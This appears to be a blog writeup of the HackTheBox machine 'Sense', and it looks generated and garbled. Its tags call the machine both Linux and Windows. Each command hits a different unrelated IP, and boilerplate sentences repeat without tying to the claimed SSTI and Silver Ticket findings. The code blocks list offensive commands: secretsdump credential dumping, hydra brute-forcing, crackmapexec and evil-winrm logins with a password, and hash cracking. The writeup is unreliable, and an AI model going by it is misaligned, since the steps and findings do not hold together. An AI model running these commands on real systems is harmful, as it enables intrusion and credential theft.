---
TitleSEO: "HackTheBox — Sense (Insane Windows) | ZureFX"
TitlePost: "HackTheBox — Sense (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Sense. SSTI and Silver Ticket to achieve insane compromise on Windows."
Keywords: "linux, windows, insane, medium, reversing"
URL: "https://zurefx.github.io/writeups/htb-sense-315.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sense-315/"
Date: "2025-10-16"
Tags: "Linux, Windows, Insane, Medium, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-sense-315"
Permalink: "/writeups/htb-sense-315.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Sense** is rated **Insane** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.37.127.119`.

### Objectives

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.69.83.65 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p139,21,143 10.59.173.252 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.76.82.31/FUZZ
```

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.198.173
evil-winrm -i 10.86.54.57 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.27.53.65
```

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **Silver Ticket**.

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.55.193 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.37.192.60 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

```powershell
crackmapexec smb 10.29.227.12 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.127.125.73 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.78.8.98/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.59.122.186/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `evil-winrm`
- `socat`
- `netcat`
- `bloodhound`
- `psexec`
- `smbclient`
- `pwncat`
- `ffuf`

### Key Takeaways

- SSTI
- Silver Ticket
- CORS Misconfiguration
